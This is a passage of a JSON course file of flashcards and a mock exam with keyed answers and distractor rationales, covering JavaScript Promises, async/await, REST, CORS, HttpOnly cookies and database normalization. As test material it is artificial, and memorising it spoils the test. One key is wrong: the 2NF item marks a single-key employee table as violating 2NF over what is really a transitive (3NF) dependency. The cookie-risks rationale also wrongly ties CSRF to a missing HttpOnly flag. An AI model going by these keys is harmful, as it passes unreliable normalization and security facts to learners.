Promise(function(resolve, reject) {\n  console.log('2');\n  reject('3');\n  resolve('4');\n  console.log('5');\n});\npromise.then(\n  (v) =\u003e console.log(v),\n  (r) =\u003e console.log(r)\n);\nconsole.log('1');\n```\n","answer":"2, 5, 1, 3","explanation":"'2' and '5' print synchronously inside the eager executor. reject('3') settles the Promise and enqueues the rejection handler as a microtask; resolve('4') is ignored. '1' prints synchronously after the executor. When the call stack empties, the microtask queue drains: the rejection handler logs '3'. '4' never appears.","example":"// Execution order:\n// 1. Executor runs (sync): logs 2, enqueues reject handler, ignores resolve, logs 5\n// 2. promise.then() registers handlers (rejection handler already queued)\n// 3. console.log('1') runs sync\n// 4. Stack empties → microtask: rejection handler logs 3\n// '4' is never logged\n"},{"id":"promises-basics-card-05","type":"predict","lang":"js","source":"Slide 6 (Slide 25), ISAQuiz8","bloom":"apply","prompt":"What is the output? Explain why `1` does not print first.\n```js\nPromise.resolve().then(() =\u003e console.log(1));\nconsole.log(2);\n```\n","answer":"2, 1","explanation":"Promise.resolve() returns an already-fulfilled Promise, but .then() still enqueues the callback as a microtask — it does not run synchronously. console.log(2) is synchronous and runs before the microtask queue drains.","example":"// Even an already-fulfilled Promise sends .then() to the microtask queue.\n// Sync always runs before microtasks.\n"},{"id":"promises-basics-card-06","type":"cloze","source":"Slide 6 (Slide 18)","bloom":"understand","prompt":"Calling `resolve(value)` changes the Promise state to {{fulfilled}} and stores `value`; the `.then()` handler receives that value when the {{microtask queue}} drains.","answer":"fulfilled; microtask queue","explanation":"resolve() performs a synchronous state transition but defers the handler. The handler is placed in the microtask queue and runs only after the current call stack empties — not inline with resolve().","example":"new Promise((resolve) =\u003e {\n  resolve(42);          // state → fulfilled (sync)\n  console.log('after'); // still runs — handler not fired yet\n}).then((v) =\u003e console.log(v)); // microtask: logs 42 after stack empties\n"},{"id":"promises-basics-card-07","type":"name","source":"Slide 6 (Slide 35)","bloom":"remember","prompt":"What is the collective term for a Promise that has exited the pending state, whether fulfilled or rejected?","answer":"settled","explanation":"A Promise is settled when it is either fulfilled or rejected. 'Settled' is not a third state — it is a label for any non-pending Promise. Do not use 'resolved' as a synonym for settled.","example":"// fulfilled → settled\n// rejected  → settled\n// pending   → NOT settled\n"}]},{"id":"promise-chaining","name":".then() Chaining, .catch(), and .finally()","tags":["then","catch","finally","chaining","microtask-queue"],"prose":".then() returns a new Promise — that is why chaining works. Returning a value from a .then() callback fulfills the next Promise with that value. Throwing rejects it and skips to the nearest .catch(). .finally() runs on any settled outcome but receives no value. Microtask callbacks (.then(), .catch()) drain completely before any setTimeout fires.","cards":[{"id":"promise-chaining-card-01","type":"name","source":"Slide 6 (Slide 26)","bloom":"remember","prompt":"What does calling .then() on a Promise always return?","answer":"A new Promise.","explanation":".then() producing a new Promise is the mechanism that makes chaining possible. Each link in the chain is a distinct Promise object.","example":"Promise.resolve(1).then(n =\u003e n * 2); // returns a new Promise fulfilled with 2\n"},{"id":"promise-chaining-card-02","type":"cloze","source":"Slide 6 (Slide 31)","bloom":"remember","prompt":"Inside a .then() callback, returning a plain value {{fulfills}} the next Promise, while throwing an error {{rejects}} it.","answer":"fulfills; rejects","explanation":"The two exit paths from a .then() callback determine the state of the Promise that .then() returned: return → fulfilled, throw → rejected.","example":".then(n =\u003e { return n * 3; })        // fulfills next Promise with n*3\n.then(n =\u003e { throw new Error(); })   // rejects next Promise\n"},{"id":"promise-chaining-card-03","type":"name","source":"Slide 6 (Slide 46)","bloom":"understand","prompt":"What is .catch(fn) equivalent to in terms of .then()?","answer":".then(undefined, fn)","explanation":".catch() is syntactic sugar. It registers fn as the rejection handler only, passing undefined as the fulfillment handler.","example":"promise.catch(err =\u003e console.log(err));\n// same as:\npromise.then(undefined, err =\u003e console.log(err));\n"},{"id":"promise-chaining-card-04","type":"name","source":"Slide 6 (Slides 48–49)","bloom":"understand","prompt":"What argument does the .finally() callback receive?","answer":"No argument — it is called with undefined.","explanation":".finally() runs on any settled outcome but is not passed the fulfilled value or rejection reason. The chain passes the original value through unchanged.","example":"Promise.resolve(42)\n  .finally(val =\u003e console.log(val)) // logs: undefined\n  .then(val =\u003e console.log(val));   // logs: 42\n"},{"id":"promise-chaining-card-05","type":"predict","lang":"js","source":"ISAQuiz9 Q3","bloom":"apply","prompt":"Predict the console output order:\n```js\nsetTimeout(() =\u003e console.log('setTimeout1'), 0);\nPromise.resolve()\n  .then(() =\u003e console.log('then1'))\n  .then(() =\u003e console.log('then2'));\nsetTimeout(() =\u003e console.log('setTimeout2'), 0);\n```\n","answer":"then1, then2, setTimeout1, setTimeout2","explanation":".then() callbacks are microtasks. The microtask queue drains completely before any macrotask (setTimeout) fires. Both .then() callbacks run before either setTimeout callback, regardless of registration order.","example":"// Output:\n// then1\n// then2\n// setTimeout1\n// setTimeout2\n"},{"id":"promise-chaining-card-06","type":"cloze","source":"Slide 6 (Slide 29), ISAQuiz9 Q4–Q5","bloom":"apply","prompt":"A throw inside a .then() callback causes the chain to skip all subsequent .then() calls until it reaches the nearest downstream {{.catch()}}. After .catch() handles the error and returns a value, the chain resumes as {{fulfilled}}.","answer":".catch(); fulfilled","explanation":"Error propagation through a chain mirrors try/catch blocks: throw = reject, .catch() = catch block. Returning from .catch() resumes the fulfilled path.","example":"Promise.resolve('ok')\n  .then(() =\u003e { throw new Error('oops'); })\n  .then(() =\u003e console.log('skipped'))   // never runs\n  .catch(err =\u003e { return 'recovered'; })\n  .then(val =\u003e console.log(val));        // recovered\n"},{"id":"promise-chaining-card-07","type":"predict","lang":"js","source":"ISAQuiz9 Q10, Slide 6 (Slide 48)","bloom":"analyze","prompt":"Predict what `.finally()` logs:\n```js\nPromise.resolve('hello')\n  .finally(val =\u003e {\n    console.log('finally:', val);\n  });\n```\n","answer":"finally: undefined","explanation":".finally() receives no argument. The val parameter is undefined regardless of the upstream fulfilled value. The original fulfilled value ('hello') passes through to any downstream .then() unchanged.","example":"// Output: finally: undefined\n"}]},{"id":"async-await","name":"async/await syntax, relationship to promises, async function return type","tags":["async","await","promise","syntax"],"prose":"async/await is syntactic sugar over Promises. An async function always returns a Promise wrapping its return value. await pauses the async function — not the thread — until the awaited Promise settles, then resumes with the fulfilled value or throws on rejection. Omitting await when calling a Promise-returning function is a common silent bug that yields a Promise object instead of the resolved value.","cards":[{"id":"async-await-card-01","type":"cloze","source":"Slide 9 (Slide 3)","bloom":"remember","prompt":"An async function always returns a {{Promise}}.","answer":"Promise","explanation":"The async keyword wraps the function's return value in Promise.resolve(), so every invocation produces a Promise regardless of what the body returns.","example":"async function greet() { return \"Hello\"; }\n// greet() returns Promise\u003c\"Hello\"\u003e, not the string directly\n"},{"id":"async-await-card-02","type":"name","source":"ISAQuiz8 Q11","bloom":"remember","prompt":"What JavaScript type does an async function return upon invocation?","answer":"object (a Promise is an object)","explanation":"typeof on a Promise yields \"object\". ISAQuiz8 Q11 tests exactly this: the return type of an async function invocation is object, because Promises are objects.","example":"async function foo() { return 42; }\ntypeof foo(); // \"object\" — it's a Promise\n"},{"id":"async-await-card-03","type":"cloze","source":"Slide 9 (Slide 52)","bloom":"understand","prompt":"async/await is syntactic sugar over {{Promises}}; every await is equivalent to a {{.then()}} callback.","answer":"Promises; .then()","explanation":"await expr desugars to expr.then(value =\u003e /* rest of function */). The underlying Promise and microtask-queue mechanics are unchanged.","example":"// These are equivalent:\nconst val = await somePromise;\nsomePromise.then(val =\u003e { /* rest */ });\n"},{"id":"async-await-card-04","type":"predict","lang":"js","source":"Slide 9 (Slide 3)","bloom":"apply","prompt":"Predict the output:\n```js\nasync function double(n) { return n * 2; }\nconst result = double(5);\nconsole.log(result);\n```\n","answer":"Logs a Promise object, not 10.","explanation":"double(5) returns a Promise, not the number 10. To get 10, you need: double(5).then(v =\u003e console.log(v)) or await double(5) inside an async function.","example":"// Fix:\nasync function main() {\n  const result = await double(5);\n  console.log(result); // 10\n}\n"},{"id":"async-await-card-05","type":"predict","lang":"js","source":"Slide 9 (Slide 52)","bloom":"apply","prompt":"Predict what happens:\n```js\nfunction load() {\n  const data = await fetch(\"/api\");\n  return data;\n}\n```\n","answer":"SyntaxError — await is only valid inside an async function.","explanation":"await cannot appear in a non-async function. The fix is to declare load() as async function load(). Omitting async when using await is caught at parse time.","example":"// Fix:\nasync function load() {\n  const data = await fetch(\"/api\");\n  return data;\n}\n"},{"id":"async-await-card-06","type":"name","source":"Slide 9 (Slide 5)","bloom":"understand","prompt":"Does await block the JavaScript thread?","answer":"No — it pauses the async function only; other code continues on the thread.","explanation":"await suspends the async function and schedules its continuation on the microtask queue. The event loop remains free to run other callbacks while the function is paused.","example":"async function slow() {\n  await delay(1000); // pauses slow(), not the thread\n}\nslow();\nconsole.log(\"runs immediately — thread not blocked\");\n"}]}]}],"mockExam":{"duration_seconds":7200,"pass_mark":0.6,"questions":[{"id":"js-scope-hoisting-q-01","type":"MCQ","topic":"var/let/const Scope and Hoisting","marks":2,"question":"What does the following code print to the console?\n\n```js\nconsole.log(x);\nvar x = 42;\n```\n","choices":["`42`","`ReferenceError: x is not defined`","`undefined`","`null`"],"correct":2,"rationale":"The `var x` declaration is hoisted to the top of its enclosing scope before any line executes.\nOnly the declaration moves — the initialization `= 42` stays at its original line — so `x` exists\nin scope but holds `undefined` when `console.log` runs. Distractor B (`ReferenceError`) targets\nthe misconception that reading a variable before its written line always throws an error; that rule\napplies to `let`/`const` in the Temporal Dead Zone, not to `var`. Distractor A (`42`) targets\nstudents who assume the entire declaration-with-assignment is hoisted together. Distractor D\n(`null`) targets students who conflate the \"not yet assigned\" state with an explicit `null` value.\n","bloom":"understand","source":"Slide 1, ISAQuiz6 Q3"},{"id":"js-scope-hoisting-q-02","type":"MCQ","topic":"var/let/const Scope and Hoisting","marks":2,"question":"What does the following code print to the console?\n\n```js\nfunction show() {\n  console.log(msg);\n  var msg = \"hello\";\n  console.log(msg);\n}\nshow();\n```\n","choices":["`ReferenceError: msg is not defined`, then `hello`","`undefined`, then `hello`","`hello`, then `hello`","`undefined`, then `undefined`"],"correct":1,"rationale":"Inside `show`, the `var msg` declaration is hoisted to the top of the function body, giving `msg`\nthe initial value `undefined` before any statement runs. The first `console.log(msg)` therefore\nprints `undefined`. Then the assignment `msg = \"hello\"` executes and the second `console.log`\nprints `\"hello\"`. Distractor A (`ReferenceError`) repeats the same TDZ-confusion targeted in\nq-01 — students incorrectly apply `let`/`const` semantics to `var`. Distractor C (`hello, hello`)\ntargets the misconception that the entire `var msg = \"hello\"` statement is moved, including the\nassignment. Distractor D (`undefined, undefined`) targets students who believe the assignment\nnever executes because the declaration was hoisted.\n","bloom":"apply","source":"Slide 1, ISAQuiz6 Q3"},{"id":"js-scope-hoisting-q-03","type":"MCQ","topic":"var/let/const Scope and Hoisting","marks":2,"question":"What does the following code print to the console?\n\n```js\nif (true) {\n  let score = 99;\n}\nconsole.log(score);\n```\n","choices":["`99`","`undefined`","`ReferenceError: score is not defined`","`null`"],"correct":2,"rationale":"`let` is block-scoped: `score` lives only inside the `if` block's `{}`. Once that block closes,\n`score` is gone from the enclosing scope. Accessing it outside throws `ReferenceError: score is\nnot defined`. Distractor A (`99`) targets students who apply `var`-style function-scope thinking\nto `let`. Distractor B (`undefined`) targets the same `var`-hoisting analogy — students expect\n`let` to hoist as `undefined` the way `var` does; it does not; `let` throws instead. Distractor D\n(`null`) targets students who conflate \"out of scope\" with an explicit `null` value.\n","bloom":"understand","source":"Slide 1, ISAQuiz6 Q5"},{"id":"rest-anatomy-q-01","type":"MCQ","topic":"Anatomy of Web APIs","marks":2,"question":"A developer sends `POST /v1/patients/` three times with identical request bodies.\nHow many patient records does the server create?\n","choices":["One — POST is idempotent, so duplicate calls are ignored.","Three — POST is not idempotent, so each call creates a new record.","Zero — POST requires a unique ID in the URL before the server stores anything.","It depends on the status code returned by the first call."],"correct":1,"rationale":"POST is not idempotent. An operation is idempotent if applying it multiple times produces the same result as applying it once; POST does not satisfy that property — each call creates a new resource, so three identical POST requests produce three patient records. Option A targets the misconception that POST behaves like PUT (which is idempotent) because both can carry a request body. Option C conflates POST with PUT/PATCH, which do require an ID in the path for single-resource targeting. Option D is a distractor targeting students who confuse response-code inspection with idempotency rules; the status code returned describes what happened, not whether the operation was safe to repeat.\n","bloom":"remember","source":"Slide 8, ISAQuiz7.pdf Q8","tags":["pretest"]},{"id":"rest-anatomy-q-02","type":"MCQ","topic":"Anatomy of Web APIs","marks":2,"question":"A client sends `PUT /v1/patients/1` with a body containing only `{\"phone\": \"604-555-0101\"}`.\nThe patient record currently stores `name`, `age`, and `phone`.\nWhat is the state of the record after the request succeeds?\n","choices":["Only `phone` is updated; `name` and `age` are unchanged.","The record contains only `phone`; `name` and `age` are overwritten with null or empty values.","The request is rejected — PUT requires all fields to be present in the body.","The server merges the body with the existing record, leaving no fields missing."],"correct":1,"rationale":"PUT replaces the entire resource. Sending a partial body overwrites the stored document — fields absent from the payload become null or are removed, depending on the schema. Option A describes PATCH behaviour; the misconception is confusing PUT (replace-whole) with PATCH (update-one-field). Option C is a common student guess — past-exam wrong answers show students believe the server enforces schema completeness as a precondition of PUT; it does not (schema validation is separate from HTTP semantics). Option D describes a merge-patch strategy that is closer to PATCH; students frequently imagine PUT as an intelligent merge because merging feels safer.\n","bloom":"apply","source":"Slide 8, ISAQuiz7.pdf Q7"},{"id":"rest-anatomy-q-03","type":"MCQ","topic":"Anatomy of Web APIs","marks":2,"question":"Which statement correctly describes the difference between a `4xx` status code\nand a `5xx` status code?\n","choices":["4xx indicates a server error; 5xx indicates a client error.","4xx indicates a client error; 5xx indicates a server error.","Both 4xx and 5xx indicate server errors — the difference is only in severity.","4xx means the request was redirected; 5xx means the request succeeded partially."],"correct":1,"rationale":"Status codes group by their leading digit: 2xx is success, 3xx is redirect, 4xx is client error, and 5xx is server error. A 4xx response means the client sent a request the server understood but could not fulfil because of something the client did (bad URL, missing auth, malformed body). A 5xx response means the server itself failed while processing a valid request. Option A reverses the two categories — a common exam mistake where students memorise the digit range without the direction of blame. Option C reflects a misconception that 4xx and 5xx are on a single severity scale rather than representing distinct fault owners. Option D conflates 3xx (redirect) with 4xx, a distractor drawn from students mixing up the first-digit category table.\n","bloom":"understand","source":"Slide 3, Slide 8, ISAQuiz7.pdf Q8"},{"id":"ajax-cors-q-01","type":"MCQ","topic":"AJAX, CORS, and Same-Origin Policy","marks":2,"question":"An `XMLHttpRequest` object has just been constructed with `new XMLHttpRequest()`, but `open()` has not yet been called.\nWhat is the value of `readyState` at this point?\n","choices":["0 (UNSENT)","1 (OPENED)","4 (DONE)","5 (COMPLETE)"],"correct":0,"rationale":"`readyState` is set to 0 (UNSENT) immediately on construction, before any method is called on the object.\nThe `open()` call advances `readyState` to 1 (OPENED); it does not start at 1.\n`readyState` 4 (DONE) is the terminal state indicating the operation is complete — confusing it with the initial state conflates end state with start state, a documented distractor (Slide 5, Quiz 6).\n`readyState` 5 does not exist; the scale is strictly 0–4. Checking `readyState == 5` never fires (Slide 5, Quiz 6).\n","bloom":"remember","source":"Slide 5, ISAQuiz6.pdf"},{"id":"ajax-cors-q-02","type":"MCQ","topic":"AJAX, CORS, and Same-Origin Policy","marks":2,"question":"The following handler is attached to an XHR request:\n\n```js\nxhttp.onreadystatechange = function () {\n  if (this.readyState == 4 && this.status == 200) {\n    document.getElementById(\"result\").innerHTML = this.responseText;\n  }\n};\n```\n\nThe handler fires but the `if` block never executes.\nThe server returns HTTP 200 and the network tab shows a completed response.\nWhich `readyState` value is `this.readyState` most likely holding when the check fails?\n","choices":["3 (LOADING) — the response body is still arriving","5 (COMPLETE) — the browser advances past DONE","0 (UNSENT) — the object was never opened","1 (OPENED) — open() was called but send() was not"],"correct":0,"rationale":"`onreadystatechange` fires on every state transition, including 1, 2, and 3 (LOADING), where the response body is still streaming in.\nIf `readyState` is 3 when the handler fires, the `== 4` check fails even though the server has responded — the transition to 4 (DONE) happens on a subsequent fire.\n`readyState` 5 does not exist; the value never advances past 4 (Slide 5, Quiz 6). Believing the browser increments past DONE is a common distractor.\nStates 0 and 1 precede `send()`, so the handler would not have fired from network activity at those points.\n","bloom":"apply","source":"Slide 5, ISAQuiz6.pdf"},{"id":"ajax-cors-q-03","type":"MCQ","topic":"AJAX, CORS, and Same-Origin Policy","marks":2,"question":"A browser script on `http://localhost:3000` uses XHR to send the following request:\n\n```js\nxhttp.open(\"DELETE\", \"http://api.example.com/users/42\", true);\nxhttp.withCredentials = true;\nxhttp.send();\n```\n\nThe server at `http://api.example.com` responds with:\n\n```\nAccess-Control-Allow-Origin: *\nAccess-Control-Allow-Credentials: true\n```\n\nWhat does the browser do with the response?\n","choices":["Rejects the response — `withCredentials` requires a specific origin, not `*`","Accepts the response — both CORS headers are present","Rejects the response — DELETE always requires a separate preflight that was not shown","Accepts the response — `withCredentials` is only checked for POST requests"],"correct":0,"rationale":"When `withCredentials` is `true`, the browser requires `Access-Control-Allow-Origin` to name a specific origin (e.g. `http://localhost:3000`), not the wildcard `*`. The wildcard and credentials flag are mutually exclusive; the browser rejects the response even if `Access-Control-Allow-Credentials: true` is present (Slide 5, Slide 9).\nThinking both CORS headers together are sufficient ignores the spec rule that `*` is never acceptable with credentials — the combination is invalid regardless of other headers.\nThe preflight distractor is accurate in isolation (DELETE is non-simple and does trigger a preflight), but the question's stated failure cause is the `*` + `withCredentials` conflict, not a missing preflight.\n`withCredentials` applies to all HTTP methods, not only POST; limiting it to POST reflects a misconception about how the flag works.\n","bloom":"analyze","source":"Slide 5, Slide 9, Slide 10"},{"id":"httponly-cookies-q-01","type":"MCQ","topic":"HttpOnly cookies — flags and XSS protection","marks":2,"question":"A login endpoint issues a session token. The token is stored in an HttpOnly cookie.\nAn attacker injects a script that calls `document.cookie`. What does the script retrieve?\n","choices":["The full token value, because document.cookie returns all cookies","An empty string, because HttpOnly blocks JavaScript from reading that cookie","An encrypted form of the token, which the attacker must decrypt","A browser error, because document.cookie is disabled when HttpOnly cookies are present"],"correct":1,"rationale":"The HttpOnly flag blocks JavaScript from reading the cookie value. Any call to `document.cookie`\nreturns an empty string for cookies marked HttpOnly — the browser manages them exclusively and\nnever exposes their value to page scripts. This removes the read surface that XSS exploits rely on.\nOption A targets the misconception that HttpOnly merely hides the cookie from some APIs but not\n`document.cookie` itself. Option C confuses HttpOnly (an access restriction) with encryption (a\ntransformation of the stored value). Option D wrongly implies HttpOnly disables the `document.cookie`\nAPI globally rather than simply withholding the HttpOnly cookie value from its output.\n","bloom":"understand","source":"Slide 9, Slide 10, ISAQuiz11 Q1"},{"id":"httponly-cookies-q-02","type":"MCQ","topic":"HttpOnly cookies — risks of omission","marks":2,"question":"A developer sets a JWT cookie without the `HttpOnly` attribute. Which risks does this create?\n","choices":["Cross-site scripting (XSS) attacks only","Cross-site request forgery (CSRF) attacks only","Session hijacking attacks only","All of: XSS attacks, CSRF attacks, and session hijacking"],"correct":3,"rationale":"Omitting HttpOnly opens all three attack vectors simultaneously, not just one. Without HttpOnly,\ninjected scripts can read the token via `document.cookie` (XSS theft). Without SameSite and Secure\nprotections working as a system, forged cross-site requests can carry the cookie (CSRF). And with\nthe token exposed, an attacker can impersonate the session (session hijacking). The cookie flags work\nas a system — each one closes a distinct attack surface. Option A is the most common wrong answer on\nISAQuiz11 Q3: selecting only XSS scores zero because the other two vectors are equally real. Option B\nwrongly targets CSRF in isolation; CSRF is mitigated primarily by SameSite, but omitting HttpOnly still\nworsens the overall security posture. Option C wrongly isolates session hijacking as the sole risk.\n","bloom":"analyze","source":"Slide 9, Slide 10, ISAQuiz11 Q3, ISAQuiz11 Q8"},{"id":"httponly-cookies-q-03","type":"MCQ","topic":"HttpOnly cookies — cross-origin credential flow","marks":2,"question":"A React app at `http://localhost:3000` makes an XHR request to an Express server at\n`http://localhost:5000`. The server sets an HttpOnly cookie on login. Every subsequent\nGET request to `/profile` returns 401. `withCredentials` is not set on the XHR.\nWhat is the cause?\n","choices":["The HttpOnly flag prevents the browser from sending the cookie on any request","The browser strips cookies from cross-origin requests when withCredentials is false","The Secure flag is required before the browser will send an HttpOnly cookie","The server must echo `Set-Cookie` on every response for the cookie to persist"],"correct":1,"rationale":"For cross-origin requests, the browser strips all cookies when `withCredentials` is `false`\n(the default). The server receives no authentication cookie and cannot identify the user, so it\nreturns 401. Setting `withCredentials: true` on the XHR, combined with the server returning\n`Access-Control-Allow-Credentials: true`, causes the browser to include the HttpOnly cookie.\nOption A is wrong: HttpOnly restricts JavaScript read access, not the browser's own sending\nmechanism — the browser continues to attach HttpOnly cookies to same-origin requests automatically.\nOption C confuses the Secure flag's role (HTTPS-only transmission) with the withCredentials\nmechanism that governs cross-origin cookie sending. Option D is wrong: a cookie set via Set-Cookie\npersists without being re-issued on every response, until it expires or is explicitly deleted.\n","bloom":"apply","source":"Slide 9, Slide 10, ISAQuiz11"},{"id":"promises-basics-q-01","type":"MCQ","topic":"Promises: Constructor, States, and Eager Execution","marks":2,"question":"What is the output of the following code?\n\n```js\nconst fn1 = () =\u003e new Promise((resolve, reject) =\u003e {\n  console.log(1);\n  resolve('success');\n});\n\nfn1().then((res) =\u003e {\n  console.log(res);\n});\n\nconsole.log('start');\n```\n","choices":["`1`, `start`, `success`","`start`, `1`, `success`","`1`, `success`, `start`","`start`, `success`, `1`"],"correct":0,"rationale":"The executor runs eagerly — immediately on construction, before any `.then()` is attached or any subsequent synchronous statement executes. `console.log(1)` fires first because it sits inside the executor. `resolve('success')` changes the Promise state to fulfilled synchronously, but the `.then()` callback is not called at that moment; it is enqueued as a microtask. `console.log('start')` is the next synchronous statement and runs before the microtask queue drains, so `start` appears second. Only after the call stack empties does the microtask queue drain, printing `success` last. Distractor B targets the misconception that the executor is deferred until a consumer attaches — students who believe `.then()` triggers the executor would expect `start` first. Distractor C targets students who assume `resolve()` calls the `.then()` handler inline, before returning to the outer synchronous code. Distractor D targets students who believe both the executor and the handler are deferred, placing all async activity after synchronous code.\n","bloom":"apply","source":"Slide 6, ISAQuiz8 Q2"},{"id":"promises-basics-q-02","type":"MCQ","topic":"Promises: Constructor, States, and Eager Execution","marks":2,"question":"What is the output of the following code?\n\n```js\nlet promise = new Promise(function(resolve, reject) {\n  console.log('2');\n  reject('3');\n  resolve('4');\n  console.log('5');\n});\npromise.then(\n  (val)    =\u003e console.log(val),\n  (reason) =\u003e console.log(reason)\n);\nconsole.log('1');\n```\n","choices":["`2`, `5`, `1`, `3`","`2`, `5`, `1`, `4`","`2`, `5`, `3`, `1`","`1`, `2`, `5`, `3`"],"correct":0,"rationale":"The executor runs eagerly, so `console.log('2')` fires first. `reject('3')` immediately transitions the Promise to rejected and enqueues the rejection handler as a microtask with argument `'3'`. `resolve('4')` arrives after the Promise is already settled — settlement is permanent, so this call is silently ignored and `'4'` never appears in the output. `console.log('5')` still executes synchronously inside the executor. After the executor returns, `promise.then(...)` registers the handlers (the rejection handler is already queued). `console.log('1')` runs synchronously. Only after the call stack empties does the microtask queue drain, invoking the rejection handler and printing `'3'`. Distractor B targets the misconception that `resolve()` wins over `reject()` because it follows it, causing `'4'` instead of `'3'`. Distractor C targets students who believe microtasks drain immediately after `reject()` fires, printing `'3'` before the synchronous `console.log('1')`. Distractor D targets students who expect the executor to be deferred, placing the synchronous `console.log('1')` before the executor body.\n","bloom":"analyze","source":"Slide 6, ISAQuiz8 Q3"},{"id":"promises-basics-q-03","type":"MCQ","topic":"Promises: Constructor, States, and Eager Execution","marks":2,"question":"Which statement about Promise states is **incorrect**?\n","choices":["A pending Promise can be fulfilled with a value or rejected with a reason.","Once a Promise is settled, calling `resolve()` or `reject()` again on it has no effect.","A Promise transitions from pending to fulfilled when `resolve()` is called, and from pending to rejected when `reject()` is called.","A pending Promise cannot be fulfilled with a value or rejected with a reason."],"correct":3,"rationale":"The incorrect statement is D. A Promise in the pending state is precisely the state in which it *can* be fulfilled or rejected — that is the only state from which a transition is possible. `resolve(value)` transitions pending to fulfilled; `reject(reason)` transitions pending to rejected. Once a Promise leaves the pending state it is settled, and all subsequent calls to `resolve()` or `reject()` are silent no-ops (statement B). Statement A and C correctly describe valid one-way transitions. Distractor A looks suspicious to students who conflate \"pending\" with \"not yet usable,\" but pending is the active, transitionable state. Distractor B mirrors a real pitfall — some students assume multiple `resolve()` calls each trigger a `.then()` handler, which is false. Distractor C is a restatement of the correct state-machine transitions and is therefore a true statement, not the incorrect one.\n","bloom":"remember","source":"Slide 6, ISAQuiz8 Q4"},{"id":"db-relational-design-q-01","type":"MCQ","topic":"Relational DB design: keys, relationships, and normalization","marks":2,"question":"A `Student` table has columns `studentID (PK)`, `name`, `enrollmentDate`. A separate `Enrollment` table has columns `enrollmentID (PK)`, `studentID`, `courseCode`, `grade`.\n\nWhich column in `Enrollment` is the **foreign key**, and what does its presence enforce?\n","choices":["`enrollmentID` — it uniquely identifies each enrollment row","`studentID` in `Enrollment` — it references `Student.studentID` and enforces referential integrity","`studentID` in `Student` — it links the parent table back to the child table","`courseCode` — it references the course catalog and acts as the join column"],"correct":1,"rationale":"`Enrollment.studentID` is the foreign key because it references the primary key of the `Student` table. A foreign key enforces referential integrity — every value stored in `Enrollment.studentID` must already exist as a `studentID` in `Student`, preventing orphan rows. Choice A targets the misconception that the primary key of the child table is the foreign key; `enrollmentID` uniquely identifies enrollment rows but does not reference another table. Choice C reverses the direction — the parent table's primary key is not a foreign key pointing to its own child. Choice D targets the misconception that any join column is a foreign key; `courseCode` has no declared FK constraint in this schema.\n","bloom":"understand","source":"Slide 7, Quiz 10"},{"id":"db-relational-design-q-02","type":"MCQ","topic":"Relational DB design: keys, relationships, and normalization","marks":2,"question":"A clinic database has a `patient` table (`patientid PK`, `name`) and a `visit` table (`visitid PK`, `patientid FK`, `visitDate`). A developer tries to delete the row for `patientid = 5` from `patient`, but the DELETE fails.\n\nWhat is the most likely reason?\n","choices":["Primary keys cannot be deleted once inserted","The `visit` table has no primary key, so the constraint cannot be evaluated","One or more rows in `visit` still reference `patientid = 5`, and the active foreign key constraint blocks deletion","The `patientid` column in `visit` must be set to NULL before the parent row can be deleted"],"correct":2,"rationale":"MySQL enforces referential integrity by blocking DELETE on a parent row that has matching child rows. If `visit` contains rows where `patientid = 5`, removing the parent row in `patient` would create orphan records — visit rows pointing to a nonexistent patient. The constraint stops this by default. Choice A is false — primary key values are deletable when no child rows reference them. Choice B is false — the foreign key constraint is on `visit.patientid`; whether `visit` has its own primary key does not affect enforcement of that FK. Choice D reflects a partial truth (NULLing child FKs before deleting the parent is one resolution strategy) but is not the reason the DELETE fails — it describes a workaround, not the cause.\n","bloom":"apply","source":"Slide 7, Quiz 10"},{"id":"db-relational-design-q-03","type":"MCQ","topic":"Relational DB design: keys, relationships, and normalization","marks":2,"question":"A table stores employee data with columns: `employeeID (PK)`, `name`, `officeCity`, `officeCountry`. Every cell holds exactly one value and every row is unique.\n\nWhich normal form statement is correct?\n","choices":["The table violates both 1NF and 2NF","The table violates 1NF but complies with 2NF","The table complies with 2NF and therefore also complies with 1NF","The table complies with 1NF but violates 2NF"],"correct":3,"rationale":"1NF requires every column to hold one atomic value per row with no repeating groups — this table satisfies that because each cell holds a single value. 2NF requires every non-key column to depend on the entire primary key. Here `officeCountry` is determined by `officeCity`, not by `employeeID` — that partial transitive dependency violates 2NF. Choice A targets the misconception from ISAQuiz10 Q5 where students incorrectly marked the table as violating both forms; since all values are atomic, 1NF holds. Choice B is logically impossible: 2NF requires 1NF as a prerequisite, so a table cannot violate 1NF while complying with 2NF. Choice C targets the misconception that satisfying 2NF automatically means the table is fully normalized beyond scrutiny; the statement is structurally plausible but wrong here because 2NF is violated.\n","bloom":"analyze","source":"Slide 7, Slide 10, Quiz 10 Q5"},{"id":"js-functions-q-01","type":"MCQ","topic":"Function declarations, callbacks, first-class functions, closures","marks":2,"question":"What does the following code print to the console?\n\n```js\nfunction hiGenerator(greeting) {\n  return function(name) {\n    return greeting + ', ' + name;\n  };\n}\nconst sayHi = hiGenerator('Hello');\nconsole.log(sayHi('World'));\n```\n","choices":["`undefined, World`","`Hello, World`","`ReferenceError: greeting is not defined`","Nothing is printed — `sayHi('World')` returns a value but `console.log` is never reached"],"correct":1,"rationale":"`hiGenerator('Hello')` runs and binds `greeting` to `'Hello'`, then returns the inner function.\nThat inner function is a closure: it retains a reference to `greeting` in its scope chain even\nafter `hiGenerator` has returned. When `sayHi('World')` is called, `greeting` is still `'Hello'`\nand `name` is `'World'`, so the return value is `'Hello, World'`, which `console.log` prints.\nDistractor A (`undefined, World`) targets students who assume `greeting` is lost after\n`hiGenerator` returns, expecting the variable to read as `undefined`. Distractor C (`ReferenceError`)\ntargets students who believe closures cannot access outer-scope variables after the enclosing\nfunction exits. Distractor D targets students confused by the `console.log` call being outside\nthe function — it is in the outer scope and executes normally.\n","bloom":"apply","source":"Slide 3, ISAQuiz6 Q12"},{"id":"js-functions-q-02","type":"MCQ","topic":"Function declarations, callbacks, first-class functions, closures","marks":2,"question":"What does the following code print to the console?\n\n```js\nfunction tripleNumber(n) { return n * 3; }\nfor (let i = 0; i \u003c 4; i++) {\n  console.log(tripleNumber(i));\n}\n```\n","choices":["`0`, `3`, `6`, `9`","`undefined`, `undefined`, `undefined`, `undefined`","`0`, `3`, `6`, `9` — then `Error: tripleNumber is undefined`","`3`, `6`, `9`, `12`"],"correct":0,"rationale":"`tripleNumber` returns `n * 3`. The loop runs for `i = 0, 1, 2, 3` and passes each `i` as the\nargument. The four return values are `0`, `3`, `6`, `9`, each immediately passed to `console.log`.\nDistractor B (`undefined × 4`) targets students who confuse a missing `return` statement with the\npresent one — in ISAQuiz3 Q12 this exact distractor appeared for a case where the function\nlacked `return`; here the function does have `return`. Distractor C targets students who believe\na function cannot be called inside a loop multiple times. Distractor D (`3, 6, 9, 